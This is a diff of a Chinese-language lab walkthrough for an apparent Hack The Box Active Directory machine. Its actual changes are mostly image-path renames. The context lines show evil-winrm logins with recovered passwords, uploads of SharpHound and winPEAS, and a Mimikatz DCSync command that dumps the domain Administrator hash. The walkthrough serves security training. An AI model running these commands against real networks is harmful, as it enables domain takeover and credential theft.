@@ -102,7 +102,7 @@ evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
 
 <figure><img src="../../.gitbook/assets/16.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/17.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/17 (1).png" alt=""><figcaption></figcaption></figure>
 
 ## 权限提升
 
@@ -116,19 +116,19 @@ net user /domain
 net user fsmith /domain
 ```
 
-<figure><img src="../../.gitbook/assets/18.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/18 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/19.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/19 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/20.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/20 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/21.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/21 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/22.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/22 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/23.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/23 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/24.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/24 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 因为常规的手动枚举并没有什么其他有用信息，所以决定使用bloodhound对该机器的所有信息进行分析，此时继续使用evil-winrm的upload模块，上传sharphound.exe到目标机器中进行信息收集：
 
@@ -139,11 +139,11 @@ upload /root/Documents/HTB-AD/sauna/tools/sharphound.exe
 .\sharphound.exe
 ```
 
-<figure><img src="../../.gitbook/assets/25.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/25 (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/26.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/27.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/27 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 将这个压缩文件下载下来，直接拖入Bloodhound里就行了：
 
@@ -152,11 +152,11 @@ upload /root/Documents/HTB-AD/sauna/tools/sharphound.exe
 download 20240713.............._BloodHound.zip
 ```
 
-<figure><img src="../../.gitbook/assets/28.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/28 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 在查看SVC\_LOANMGR@EGOTISTICAL-BANK.LOCAL这个账户时发现，该账户有权限访问目标域上的所有更改（GetChangesAll / GetChanges），这意味着我可以执行DCsync攻击：
 
-<figure><img src="../../.gitbook/assets/29.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/29 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 接下来继续使用evil-winrm上传winPEAS到目标中进行再次信息收集：
 
@@ -164,11 +164,11 @@ download 20240713.............._BloodHound.zip
 upload upload /root/Documents/HTB-AD/sauna/tools/winPEASx64.exe
 ```
 
-<figure><img src="../../.gitbook/assets/30.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/30 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 输出信息中包含了SVC\_LOANMGR账户的用户名和密码：
 
-<figure><img src="../../.gitbook/assets/31.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/31 (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
@@ -178,7 +178,7 @@ upload upload /root/Documents/HTB-AD/sauna/tools/winPEASx64.exe
 evil-winrm -i 10.129.82.224 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
 ```
 
-<figure><img src="../../.gitbook/assets/32.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/32 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 上传mimikatz到目标中，然后用DCsync攻击转储内置域管理员账户哈希：
 
@@ -189,11 +189,11 @@ upload Invoke-Mimikatz.ps1
 Invoke-Mimikatz -Command '"lsadump::dcsync /domain:Egotistical-bank.local /user:Administrator"'
 ```
 
-<figure><img src="../../.gitbook/assets/33.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/33 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/34.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/34 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/35.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/35 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 获得Administrator账户及其hash值：
 
